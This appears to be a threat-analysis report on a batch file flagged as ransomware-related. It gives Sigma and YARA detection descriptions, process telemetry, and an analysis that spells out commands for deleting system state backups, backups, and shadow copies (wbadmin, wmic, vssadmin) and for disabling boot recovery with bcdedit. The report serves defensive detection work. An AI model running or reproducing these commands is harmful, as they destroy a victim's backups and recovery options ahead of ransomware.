sigma_analysis_results.rule_description:
Detects the deletion of all backups or system state backups via "wbadmin.exe".
This technique is used by numerous ransomware families and actors.
This may only be successful on server platforms that have Windows Backup enabled.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\george\Desktop\; OriginalFileName=WBADMIN.EXE; Hashes=SHA1=51A31AA648D9B084A814C1083E2FE4A49CF17EA6,MD5=EE1E2C4D42579B19D765420E07589148,SHA256=5897AF142FACD58CF3C919263612D81A2D052B8769EA73343CC123650C1EC410,IMPHASH=9A00B7A0CB1FA540BC07C0F8C801306A; Description=Command Line Interface for Microsoft\xae BLB Backup; EventID=1; ParentCommandLine=C:\Windows\system32\cmd.exe /c ""C:\Users\george\Desktop\backup (1).bat" "; CommandLine=wbadmin  DELETE SYSTEMSTATEBACKUP -keepVersions:0; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\cmd.exe; IntegrityLevel=High; Image=C:\Windows\System32\wbadmin.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects the use of the bcdedit command to tamper with the boot configuration data. This technique is often times used by malware or attackers as a destructive way before launching ransomware.
sigma_analysis_results.rule_author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

attributes.magic: ASCII text, with CRLF line terminators

crowdsourced_yara_results.description: Detects command variations typically used by ransomware
crowdsourced_yara_results.author: ditekSHen

crowdsourced_ai_results.analysis:
The provided code snippet performs a series of actions related to system backups and recovery settings.

1. Deletion of System State Backups:
   - `wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0` deletes all system state backups.

2. Deletion of Backups:
   - `wbadmin DELETE BACKUP -keepVersions:0` deletes all backups.

3. Deletion of Shadow Copies:
   - `wmic SHADOWCOPY DELETE` deletes all shadow copies.

4. Deletion of Volume Shadow Copies:
   - `vssadmin Delete Shadows /All /Quiet` deletes all volume shadow copies.

5. Disabling Recovery Mode:
   - `bcdedit /set {default} recoveryenabled No` disables recovery mode.

6. Ignoring Boot Failures:
   - `bcdedit /set {default} bootstatuspolicy ignoreallfailures` sets the boot status policy to ignore all failures, preventing the system from entering recovery mode in case of boot failures.

7. Listing Existing Shadow Copies:
   - `vssadmin list shadows` lists all existing shadow copies.

This code snippet effectively removes all existing backups, including system state backups, shadow copies, and volume shadow copies. It also disables recovery mode and sets the boot status policy to ignore failures.
